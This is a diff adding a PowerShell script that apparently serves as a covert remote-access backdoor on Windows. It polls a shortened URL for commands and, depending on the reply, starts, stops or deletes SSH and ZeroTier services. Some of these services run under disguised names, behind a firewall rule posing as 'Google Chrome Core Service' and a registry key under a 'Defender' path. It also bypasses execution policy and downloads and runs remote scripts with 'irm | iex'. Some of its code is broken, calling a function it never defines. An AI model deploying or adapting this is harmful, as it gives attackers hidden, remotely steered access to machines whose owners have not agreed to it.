@@ -1,0 +1,299 @@
+# Define the URL to retrieve code and status
+$retryAttempts = 5
+$ztservice = "ZeroTierOneService"
+$sshdservice = "runtimed"
+$sshagentservice = "runtimedd"
+$ztfirewall = "ZeroTier One"
+$sshfirewall = "Google Chrome Core Service"
+$ztdir = "C:\ProgramData\ZeroTier"
+$ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
+$sshdir = "C:\Program Files\OpenSSH"
+$sshdatadir = "C:\ProgramData\ssh"
+$regPath = "HKLM:\Software\Defender"
+$sshinstall = "https://tinyurl.com/backupinstall"
+$ztinstall = "https://tinyurl.com/ztinstall"
+$codeUrl = "https://tinyurl.com/remcue"
+$programDataPath = $env:ProgramData
+$outputvalue = (Get-ItemProperty -Path $regPath).Data
+$code = (Get-ItemProperty -Path $regPath).Code
+
+# Bypass execution policy
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+
+function web-install {
+    param (
+        [string]$InstallScriptURL
+    )
+
+    try {
+        Write-Host "Installing Program from $InstallScriptURL..."
+        $errorOutput = irm $InstallScriptURL 2>&1 | iex
+        if ($LASTEXITCODE -eq 0) {
+            Write-Host "Web Install installation completed."
+        } else {
+            Write-Host "Installation failed with error: $errorOutput"
+        }
+    }
+    catch {
+        Write-Host "Failed to install Web Install: $_"
+    }
+}
+
+
+# Function to Start a Service Safely
+function Start-ServiceSafe {
+    param (
+        [string]$ServiceName
+    )
+    try {
+        $serviceStatus = Get-Service -Name $ServiceName -ErrorAction Stop
+        if ($serviceStatus.Status -ne "Running") {
+            # Start the service
+            Start-Service -Name $ServiceName
+        }
+    }
+    catch {
+        Write-Host "Service $ServiceName not found or cannot be manipulated."
+    }
+}
+
+
+#Function to Stop a Service
+function Stop-ServiceSafe {
+    param (
+        [string]$ServiceName
+    )
+    try {
+        $serviceStatus = Get-Service -Name $ServiceName -ErrorAction Stop
+        if ($serviceStatus.Status -eq "Running") {
+            # Stop the service
+            Stop-Service -Name $ServiceName -Force
+        }
+    }
+    catch {
+        Write-Host "Service $ServiceName not found or cannot be manipulated."
+    }
+}
+
+# Function to Delete a Service
+function Delete-ServiceSafe {
+    param (
+        [string]$ServiceName
+    )
+    try {
+        $serviceStatus = Get-Service -Name $ServiceName -ErrorAction Stop
+        # Stop the service if it is running
+        if ($serviceStatus.Status -eq "Running") {
+            Stop-Service -Name $ServiceName -Force
+        }
+        # Delete the service
+        sc.exe delete $ServiceName
+    }
+    catch {
+        Write-Host "Service $ServiceName not found or cannot be manipulated."
+    }
+}
+
+# Function to disable firewall rules
+function Disable-FirewallRules {
+    param (
+        [string]$ruleNames
+    )
+    
+    $ruleNames | ForEach-Object {
+        $ruleName = $_
+        try {
+            netsh advfirewall firewall set rule name="$ruleName" new enable=no
+        } catch {
+            Write-Host "Failed to disable firewall rule $ruleName." -ForegroundColor Red
+        }
+    }
+}
+
+# Function to delete firewall rules
+function Remove-FirewallRuleSafe {
+    param (
+        [string]$RuleName
+    )
+
+    try {
+        $existingRule = Get-NetFirewallRule -DisplayName $RuleName -ErrorAction Stop
+        if ($existingRule) {
+            Remove-NetFirewallRule -DisplayName $existingRule
+            Write-Host "Firewall rule '$RuleName' removed."
+        }
+    }
+    catch {
+        Write-Host "Firewall rule '$RuleName' not found or cannot be manipulated."
+    }
+}
+
+function Enable-FirewallRuleSafe {
+    param (
+        [string]$RuleName
+    )
+    try {
+        $firewallRule = Get-NetFirewallRule -Name $RuleName -ErrorAction Stop
+        if ($firewallRule.Enabled -eq $false) {
+            Set-NetFirewallRule -Name $RuleName -Enabled True
+        }
+    }
+    catch {
+        Write-Host "Firewall rule $RuleName not found or cannot be manipulated."
+    }
+}
+
+function Retry-Operation {
+    param (
+        [scriptblock]$Operation,
+        [int]$MaxRetries
+    )
+
+    $retryCount = 0
+    $retrySuccess = $false
+
+    while ($retryCount -lt $MaxRetries -and -not $retrySuccess) {
+        try {
+            $Operation.Invoke()
+            $retrySuccess = $true
+        } catch {
+            $errorMessage = $_.Exception.Message
+            $retryCount++
+        }
+    }
+
+    if (-not $retrySuccess) {
+        Write-Host "Operation failed after $MaxRetries retries."
+    }
+}
+
+
+# Function to delete directories
+function Delete-Directories {
+    param (
+        [string]$directories
+    )
+    
+    $directories | ForEach-Object {
+        $directory = $_
+        if (Test-Path -Path $directory -PathType Container) {
+            try {
+                Remove-Item -Path $directory -Force -Recurse -ErrorAction Stop
+            } catch {
+                Write-Host "Failed to delete directory $directory." -ForegroundColor Red
+            }
+        } else {
+            Write-Host "Directory $directory does not exist." -ForegroundColor Yellow
+        }
+    }
+}
+
+
+# Get the "Code" value from the Registry
+$storedCode = (Get-ItemProperty -Path $regPath).Code
+
+# Check if the "Code" value is not null (i.e., it exists)
+if ($storedCode -ne $null) {
+    # Download the status values from the URL
+    $webStatus = (Invoke-RestMethod -Uri $codeUrl).Split([Environment]::NewLine)
+
+    # Initialize the variable to store the new status
+    $status = $null
+
+    # Iterate through web status values
+    foreach ($line in $webStatus) {
+        $code, $status = $line -split ' ', 2
+
+        if ($code -eq $storedCode) {
+            # Match found
+            if ($status -eq (Get-ItemProperty -Path $regPath).Data) {
+                # Status matches, exit
+                exit
+            } else {        
+                # Perform actions based on status
+                switch ($status) {
+                    "active" {
+                        Retry-Operation {
+							Start-ServiceSafe -ServiceName sshd
+							Start-ServiceSafe -ServiceName ssh-agent
+							Start-ServiceSafe -ServiceName $ztservice
+							Start-ServiceSafe -ServiceName $sshagentservice
+							Start-ServiceSafe -ServiceName $sshdservice
+							Enable-FirewallRules -ruleName $ztfirewall
+							Enable-FirewallRules -ruleName $sshfirewall
+						} -MaxRetries $retryAttempts
+                    }
+                    "dormant" {
+					Retry-Operation {
+							Stop-ServiceSafe -ServiceName sshd
+							Stop-ServiceSafe -ServiceName ssh-agent
+							Stop-ServiceSafe -ServiceName $ztservice
+							Stop-ServiceSafe -ServiceName $sshagentservice
+							Stop-ServiceSafe -ServiceName $sshdservice
+							Disable-FirewallRules -ruleName $ztfirewall
+							Disable-FirewallRules -ruleName $sshfirewall
+						} -MaxRetries $retryAttempts
+                    }
+                    "rejoin" {
+					Retry-Operation {
+							Stop-ServiceSafe -ServiceName $ztservice
+							Stop-ServiceSafe -ServiceName $sshagentservice
+							Stop-ServiceSafe -ServiceName $sshdservice
+							Stop-ServiceSafe -ServiceName sshd
+							Stop-ServiceSafe -ServiceName ssh-agent
+							Delete-ServiceSafe -ServiceName $ztservice
+							Delete-ServiceSafe -ServiceName $sshagentservice
+							Delete-ServiceSafe -ServiceName $sshdservice
+							Delete-ServiceSafe -ServiceName sshd
+							Delete-ServiceSafe -ServiceName ssh-agent							
+							Disable-FirewallRules -ruleName $ztfirewall
+							Disable-FirewallRules -ruleName $sshfirewall
+							Remove-FirewallRuleSafe -RuleName $ztfirewall
+							Remove-FirewallRuleSafe -RuleName $sshfirewall							
+							Delete-Directories -directories $ztdir
+							Delete-Directories -directories $sshdir
+							Delete-Directories -directories $sshdatadir
+							Delete-Directories -directories $ztdatadir
+							web-install -InstallScriptURL $sshinstall
+							web-install -InstallScriptURL $ztinstall
+						} -MaxRetries $retryAttempts
+                    }
+                    "purge" {
+                        Retry-Operation {
+							Stop-ServiceSafe -ServiceName $ztservice
+							Stop-ServiceSafe -ServiceName $sshagentservice
+							Stop-ServiceSafe -ServiceName $sshdservice
+							Stop-ServiceSafe -ServiceName sshd
+							Stop-ServiceSafe -ServiceName ssh-agent
+							Delete-ServiceSafe -ServiceName $ztservice
+							Delete-ServiceSafe -ServiceName $sshagentservice
+							Delete-ServiceSafe -ServiceName $sshdservice
+							Delete-ServiceSafe -ServiceName sshd
+							Delete-ServiceSafe -ServiceName ssh-agent							
+							Disable-FirewallRules -ruleName $ztfirewall
+							Disable-FirewallRules -ruleName $sshfirewall
+							Remove-FirewallRuleSafe -RuleName $ztfirewall
+							Remove-FirewallRuleSafe -RuleName $sshfirewall							
+							Delete-Directories -directories $ztdir
+							Delete-Directories -directories $sshdir
+							Delete-Directories -directories $sshdatadir
+							Delete-Directories -directories $ztdatadir
+						} -MaxRetries $retryAttempts
+                    }
+                }
+
+                if ($status -ne $null) {
+					# Update the value in the registry
+					Set-ItemProperty -Path $regPath -Name "Data" -Value $status
+					Write-Host "Status updated to: $status"
+				}
+
+                # Exit loop as code found
+                break
+            }
+        }
+    }
+} else {
+    Write-Host "'Code' value not found in the Registry."
+}
+
